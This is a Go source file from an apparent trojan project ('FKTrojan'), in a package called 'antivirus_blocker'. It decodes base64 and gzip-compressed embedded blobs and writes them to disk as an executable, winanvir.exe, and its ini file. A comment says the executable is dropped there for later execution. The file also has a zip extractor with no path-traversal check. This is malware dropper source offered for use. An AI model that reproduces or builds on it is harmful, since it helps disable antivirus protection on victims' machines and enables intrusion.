package antivirus_blocker

import (
	"FKTrojan/common"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
)

// Write gzipped data to a Writer
func gzipWrite(w io.Writer, data []byte) error {
	// Write gzipped data to the client
	gw, err := gzip.NewWriterLevel(w, gzip.BestCompression)
	defer gw.Close()
	gw.Write(data)
	return err
}

// Write gunzipped data to a Writer
func gunzipWrite(w io.Writer, data []byte) error {
	// Write gzipped data to the client
	gr, err := gzip.NewReader(bytes.NewBuffer(data))
	defer gr.Close()
	data, err = ioutil.ReadAll(gr)
	if err != nil {
		return err
	}
	w.Write(data)
	return nil
}
func saveWinAnvirExe(filePath string) error {
	return saveBase64StrToFile(filePath, exe_zip_base64)
}
func saveWinAnvirIni(filePath string) error {
	return saveBase64StrToFile(filePath, ini_zip_base64)
}
func saveWinAnvirZip(filePath string) error {
	return saveBase64StrToFile(filePath, localdir_zip_base64)
}
func saveBase64StrToFile(filePath string, base64Code string) error {
	if common.PathExist(filePath) {
		os.Rename(filePath, filePath+".bakfile")
	}
	fileStream, err := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		return err
	}
	defer fileStream.Close()
	// exe_zip_base64很大，定义在winanvir_exe_data.go中，是可执行文件winanvir.exe的压缩+base64编码后的字符串
	// 其构造方式见TestGetZipBase64Code函数，这里通过base64decode+unzip写入到exe文件，待后续执行
	// 可能是goland编辑器的bug，变量显示未定义，Test通过，代码是没问题的
	exeByte, err := base64.StdEncoding.DecodeString(base64Code)
	if err != nil {
		return err
	}
	err = gunzipWrite(fileStream, exeByte)
	if err != nil {
		return err
	}
	return nil
}

func unzip(src string, dest string) ([]string, error) {

	var filenames []string

	r, err := zip.OpenReader(src)
	if err != nil {
		return filenames, err
	}
	defer r.Close()

	for _, f := range r.File {

		rc, err := f.Open()
		if err != nil {
			return filenames, err
		}
		defer rc.Close()

		// Store filename/path for returning and using later on
		fpath := filepath.Join(dest, f.Name)
		filenames = append(filenames, fpath)

		if f.FileInfo().IsDir() {

			// Make Folder
			os.MkdirAll(fpath, os.ModePerm)

		} else {

			// Make File
			if err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
				return filenames, err
			}

			outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
			if err != nil {
				return filenames, err
			}

			_, err = io.Copy(outFile, rc)

			// Close the file without defer to close before next iteration of loop
			outFile.Close()

			if err != nil {
				return filenames, err
			}

		}
	}
	return filenames, nil
}
